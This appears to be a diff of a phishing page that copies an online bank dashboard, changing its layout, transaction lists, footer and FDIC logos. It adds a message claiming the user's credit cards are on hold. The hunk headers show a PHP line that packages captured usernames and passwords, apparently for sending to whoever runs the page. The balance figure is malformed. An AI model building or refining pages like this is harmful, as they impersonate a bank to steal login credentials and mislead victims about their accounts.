@@ -57,9 +57,9 @@ $message = $meassage."Username: ".$username."\nPassword: ".$password;
       <div class="flex items-center">
           <div class="flex items-center ms-3">
             <div>
-              <button type="button" class="flex text-sm bg-gray-800 rounded-full focus:ring-4 focus:ring-gray-300 " aria-expanded="false" data-dropdown-toggle="dropdown-user">
+              <button type="button" class="flex text-sm border border-black rounded-full focus:ring-4 focus:ring-gray-300 " aria-expanded="false" data-dropdown-toggle="dropdown-user">
                 <span class="sr-only">Open user menu</span>
-                <img class="w-8 h-8 rounded-full" src="https://flowbite.com/docs/images/people/profile-picture-5.jpg" alt="user photo">
+                <img class="w-8 h-8 rounded-full" src="../img/user-1.png" alt="user photo">
               </button>
             </div>
             <div class="z-50 hidden my-4 text-base list-none bg-white divide-y divide-gray-100 rounded shadow  " id="dropdown-user">
@@ -134,87 +134,171 @@ $message = $meassage."Username: ".$username."\nPassword: ".$password;
 
 
 
+<div class="min-h-screen flex flex-col justify-between bg-gray-300 ">
 
-
-<main class="md:ml-64 h-auto mt-[50px]">
-  <div class="grid grid-cols-1  lg:grid-cols-2 gap-4 mb-4">
-    <div class= "bg-gray-100 rounded-lg p-4 md:h-[280px] md:ml-2 mt-4">
-      <div class="mb-4 border-0 border-b-2 pb-2 md:pb-4">
-        <p class="text-[24px] font-bold">My Balance</p>
-        <p class="text-[32px]" style="color: #026597;">$1,490,32.20</p>
-        <p class="">Available balance</p>
-      </div>
-
-        <div class="flex items-center space-x-4 justify-between p-2">
-          <div class="flex items-center space-x-4">
-            <div class=""><img src="../img/account-number.png" alt="" ></div>
-            <div>
-              <p class="font-bold">Account Number</p>
-              <p>2095....</p>
-            </div>
-          </div>
-
-          <div class="flex items-center space-x-4">
-            <div class=""><img src="../img/account-number.png" alt=""></div>
-            <div>
-              <p class="font-bold">Routing Number</p>
-              <p>2874.....</p>
-            </div>
-          </div>
+  <main class="md:ml-64 h-[auto] mt-[50px]">
+    <div class="grid grid-cols-1  lg:grid-cols-2 gap-4 mb-4">
+      <div class= "bg-gray-100 rounded-lg p-4 md:h-[280px] md:ml-2 mt-4">
+        <div class="mb-4 border-0 border-b-2 pb-2 md:pb-4">
+          <p class="text-[24px] font-bold">My Balance</p>
+          <p class="text-[32px] balance" style="color: #026597;">$1,490,32.20</p>
+          <p class="">Available balance</p>
         </div>
-    </div>
-    
-
-    <div class="rounded-lg p-4 bg-gray-100 md:mt-4">
-      <p class="text-[24px] font-bold mb-2">Upcoming Transactions</p>
-
-      <div class="flex flex-col text-[12px]">
-        <!-- upcoming 1 -->
-        <div class="border-0 border-b-2 pb-2">
-          <div class="flex justify-between items-center">
-            <div class="flex items-center space-x-2 p-2">
-              <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
+  
+          <div class="flex items-center space-x-4 justify-between p-2">
+            <div class="flex items-center space-x-4">
+              <div class=""><img src="../img/account-number.png" alt="" ></div>
               <div>
-                <p>Walmart</p>
-                <p>Groceries</p>
+                <p class="font-bold">Account Number</p>
+                <p>2095....</p>
               </div>
             </div>
   
-            <div>
-              <p>-15.20</p>
-              <p>Dec 23, 2023</p>
+            <div class="flex items-center space-x-4">
+              <div class=""><img src="../img/account-number.png" alt=""></div>
+              <div>
+                <p class="font-bold">Routing Number</p>
+                <p>2874.....</p>
+              </div>
             </div>
           </div>
-        </div>
-          <!-- upcoming 2 -->
+      </div>
+      
+  
+      <div class="rounded-lg p-4 bg-gray-100 md:mt-4">
+        <p class="text-[24px] font-bold mb-2">Upcoming Transactions</p>
+  
+        <div class="flex flex-col text-[12px]">
+          <!-- upcoming 1 -->
           <div class="border-0 border-b-2 pb-2">
             <div class="flex justify-between items-center">
               <div class="flex items-center space-x-2 p-2">
-                <img class="w-8 h-8 rounded-full" src="../img/expedia.png" alt="user photo">
+                <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
                 <div>
-                  <p>Expedia</p>
-                  <p>Travel</p>
+                  <p>Walmart</p>
+                  <p>Groceries</p>
                 </div>
               </div>
     
               <div>
-                <p>-153.10</p>
+                <p>-15.20</p>
+                <p>Dec 23, 2023</p>
+              </div>
+            </div>
+          </div>
+            <!-- upcoming 2 -->
+            <div class="border-0 border-b-2 pb-2">
+              <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2 p-2">
+                  <img class="w-8 h-8 rounded-full" src="../img/expedia.png" alt="user photo">
+                  <div>
+                    <p>Expedia</p>
+                    <p>Travel</p>
+                  </div>
+                </div>
+      
+                <div>
+                  <p>-153.10</p>
+                  <p>Dec 23, 2023</p>
+                </div>
+                
+              </div>
+            </div>   
+  
+          <!-- upcoming 3 -->
+          <div class="border-0 border-b-2 pb-2">
+            <div class="flex justify-between items-center">
+              <div class="flex items-center space-x-2 p-2">
+                <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
+                <div>
+                  <p>Netfllix</p>
+                  <p>Movies</p>
+                </div>
+              </div>
+              <div>
+                <p>-22.99</p>
+                <p>Dec 23, 2023</p>
+              </div>  
+            </div>
+          </div>
+  
+        </div>
+      </div>
+    </div>
+  
+  
+  
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+      <div class="bg-gray-100 rounded-lg p-4 md:ml-2 ">
+        <p class="text-[24px] font-bold mb-2">Recent Transactions</p>
+  
+        <div class="flex flex-col text-[12px]">
+          <!-- Recent 1 -->
+          <div class="border-0 border-b-2 pb-2">
+            <div class="flex justify-between items-center">
+              <div class="flex items-center space-x-2 p-2">
+                <img class="w-8 h-8 rounded-full" src="../img/amazon.png" alt="user photo">
+                <div>
+                  <p>Amazon</p>
+                  <p>Online Shopping</p>
+                </div>
+              </div>
+    
+              <div>
+                <p>-230.89</p>
+                <p>Dec 23, 2023</p>
+              </div>
+            </div>
+          </div>
+            <!-- Recent 2 -->
+            <div class="border-0 border-b-2 pb-2">
+              <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2 p-2">
+                  <img class="w-8 h-8 rounded-full" src="../img/spotify.png" alt="user photo">
+                  <div>
+                    <p>Spotify</p>
+                    <p>Music</p>
+                  </div>
+                </div>
+      
+                <div>
+                  <p>-16.99</p>
+                  <p>Dec 23, 2023</p>
+                </div>
+                
+              </div>
+            </div>   
+  
+          <!-- Recent 3 -->
+          <div class="border-0 border-b-2 pb-2">
+            <div class="flex justify-between items-center">
+              <div class="flex items-center space-x-2 p-2">
+                <img class="w-8 h-8 rounded-full" src="../img/hulu.png" alt="user photo">
+                <div>
+                  <p>Hulu</p>
+                  <p>Movies</p>
+                </div>
+              </div>
+    
+              <div>
+                <p>-76.99</p>
                 <p>Dec 23, 2023</p>
               </div>
               
             </div>
-          </div>   
-
-        <!-- upcoming 3 -->
+          </div>
+  
+        <!-- Recent 4 -->
         <div class="border-0 border-b-2 pb-2">
           <div class="flex justify-between items-center">
             <div class="flex items-center space-x-2 p-2">
               <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
               <div>
-                <p>Netfllix</p>
+                <p>Netflix</p>
                 <p>Movies</p>
               </div>
             </div>
+  
             <div>
               <p>-22.99</p>
               <p>Dec 23, 2023</p>
@@ -222,177 +306,82 @@ $message = $meassage."Username: ".$username."\nPassword: ".$password;
             
           </div>
         </div>
-
-      <!-- upcoming 4 -->
-      <div class="border-0 border-b-2 pb-2">
-        <div class="flex justify-between items-center">
-          <div class="flex items-center space-x-2 p-2">
-            <img class="w-8 h-8 rounded-full" src="../img/spotify.png" alt="user photo">
-            <div>
-              <p>Spotify</p>
-              <p>Music</p>
-            </div>
-          </div>
-
-          <div>
-            <p>-16.99</p>
-            <p>Dec 23, 2023</p>
-          </div>
-          
-        </div>
-      </div>
-
-      <!-- upcoming 5 -->
-      <div class="border-0 border-b-2 pb-2">
-        <div class="flex justify-between items-center">
-          <div class="flex items-center space-x-2 p-2">
-            <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
-            <div>
-              <p>Walmart</p>
-              <p>Groceries</p>
-            </div>
-          </div>
-
-          <div>
-            <p>-120.33</p>
-            <p>Dec 23, 2023</p>
-          </div>
-          
-        </div>
-      </div>
-      </div>
-    </div>
-  </div>
-
-
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
-    <div class="bg-gray-100 rounded-lg p-4 md:ml-2 md:mt-[-70px]">
-      <p class="text-[24px] font-bold mb-2">Recent Transactions</p>
-
-      <div class="flex flex-col text-[12px]">
-        <!-- Recent 1 -->
+  
+        <!-- Recent 5 -->
         <div class="border-0 border-b-2 pb-2">
           <div class="flex justify-between items-center">
             <div class="flex items-center space-x-2 p-2">
-              <img class="w-8 h-8 rounded-full" src="../img/amazon.png" alt="user photo">
+              <img class="w-8 h-8 rounded-full" src="../img/macdonalds.png" alt="user photo">
               <div>
-                <p>Amazon</p>
-                <p>Online Shopping</p>
+                <p>Macdonalds</p>
+                <p>Food</p>
               </div>
             </div>
-  
-            <div>
-              <p>-230.89</p>
-              <p>Dec 23, 2023</p>
-            </div>
-          </div>
-        </div>
-          <!-- Recent 2 -->
-          <div class="border-0 border-b-2 pb-2">
-            <div class="flex justify-between items-center">
-              <div class="flex items-center space-x-2 p-2">
-                <img class="w-8 h-8 rounded-full" src="../img/spotify.png" alt="user photo">
-                <div>
-                  <p>Spotify</p>
-                  <p>Music</p>
-                </div>
-              </div>
-    
-              <div>
-                <p>-16.99</p>
-                <p>Dec 23, 2023</p>
-              </div>
-              
-            </div>
-          </div>   
-
-        <!-- Recent 3 -->
-        <div class="border-0 border-b-2 pb-2">
-          <div class="flex justify-between items-center">
-            <div class="flex items-center space-x-2 p-2">
-              <img class="w-8 h-8 rounded-full" src="../img/hulu.png" alt="user photo">
-              <div>
-                <p>Hulu</p>
-                <p>Movies</p>
-              </div>
-            </div>
-  
-            <div>
-              <p>-76.99</p>
+          <div>
+              <p>-120.33</p>
               <p>Dec 23, 2023</p>
             </div>
             
           </div>
         </div>
-
-      <!-- Recent 4 -->
-      <div class="border-0 border-b-2 pb-2">
-        <div class="flex justify-between items-center">
-          <div class="flex items-center space-x-2 p-2">
-            <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
-            <div>
-              <p>Netflix</p>
-              <p>Movies</p>
-            </div>
-          </div>
-
-          <div>
-            <p>-22.99</p>
-            <p>Dec 23, 2023</p>
-          </div>
-          
-        </div>
-      </div>
-
-      <!-- Recent 5 -->
-      <div class="border-0 border-b-2 pb-2">
-        <div class="flex justify-between items-center">
-          <div class="flex items-center space-x-2 p-2">
-            <img class="w-8 h-8 rounded-full" src="../img/macdonalds.png" alt="user photo">
-            <div>
-              <p>Macdonalds</p>
-              <p>Food</p>
-            </div>
-          </div>
-
-          <div>
-            <p>-120.33</p>
-            <p>Dec 23, 2023</p>
-          </div>
-          
-        </div>
+  
+  
+  
       </div>
       </div>
-
-    </div>
-
-
-    <div class="bg-white rounded-lg h-[200px] md:h-[220px]">
-
+  
+      <div class="bg-gray-100">
+          <div class="p-4">
+            <p class="text-[24px] font-bold mb-2">Credit Cards</p>
+          </div>
+  
+          <div class="text-center text-red-700 p-2 md:p-4 mb-8">
+            <p>Sorry, your credit cards have been temporarily placed on hold and cannot be used for any purchases.</p>
+          </div>
       </div>
     </div>
-  </div>
-</main>
+  </main>
+  
+      <!-- mobiler -->
+      <footer class="lg:hidden">
+          <div class="bg-gray-100">
+              <ul class="flex flex-col flex text-[13px] lg:hidden py-[22px] space-y-[11px]">
+                  <li><a class="m-10" href="">Legal</a></li>
+                  <li><a class="m-10" href="">Contact us</a></li> 
+                  <li><a class="m-10" href="">Privacy</a></li>
+                  <li><a class="m-10" href="">Security</a></li>
+                  <li><a class="m-10" href="">Terms & Conditions</a></li>
+                  <li><a class="px-10" href="">Accessibility</a></li>
+              </ul>
+  
+              <div class="flex items-center justify-end space-x-4 p-4">
+                  <div><img class="w-[30px]" src="../fdic.svg" alt=""></div>
+                  <div><img class="w-[30px]" src="../equal_housing_lender.svg" alt=""></div>
+              </div>
+          </div>
+      </footer>
+      <footer class="hidden lg:block">
+          <div>
+              <div class="footer-main h-[100%] p-[12px] bg-white hidden lg:flex justify-end lg:space-x-[480px] lg:space-x-[100px] items-center ">
+                  <ul class="flex items-right flex footer text-[10px]">
+                      <li><a class="px-2" href="">Contact us</a></li> 
+                      <li><a class="px-2" href="">Legal</a></li>
+                      <li><a class="px-2" href="">Privacy</a></li>
+                      <li><a class="px-2" href="">Security</a></li>
+                      <li><a class="px-2" href="">Terms & Conditions</a></li>
+                      <li><a class="px-2" href="">Accessibility</a></li>
+                  </ul>
+  
+                  <div class="flex items-center pr-[45px] space-x-4">
+                      <div><img class="w-[35px]" src="fdic.svg" alt=""></div>
+                      <div><img class="w-[35px]" src="equal_housing_lender.svg" alt=""></div>
+                  </div>    
+  
+              </div>
+          </div>
+      </footer>
+</div>
 
-    <!-- mobiler -->
-    <footer class="lg:hidden">
-        <div class="bg-gray-100">
-            <ul class="flex flex-col flex text-[13px] lg:hidden py-[22px] space-y-[11px]">
-                <li><a class="m-10" href="">Legal</a></li>
-                <li><a class="m-10" href="">Contact us</a></li> 
-                <li><a class="m-10" href="">Privacy</a></li>
-                <li><a class="m-10" href="">Security</a></li>
-                <li><a class="m-10" href="">Terms & Conditions</a></li>
-                <li><a class="px-10" href="">Accessibility</a></li>
-            </ul>
-
-            <div class="flex items-center justify-end space-x-4 p-4">
-                <div><img class="w-[30px]" src="../fdic.svg" alt=""></div>
-                <div><img class="w-[30px]" src="../equal_housing_lender.svg" alt=""></div>
-            </div>
-        </div>
-    </footer>
  
 
     
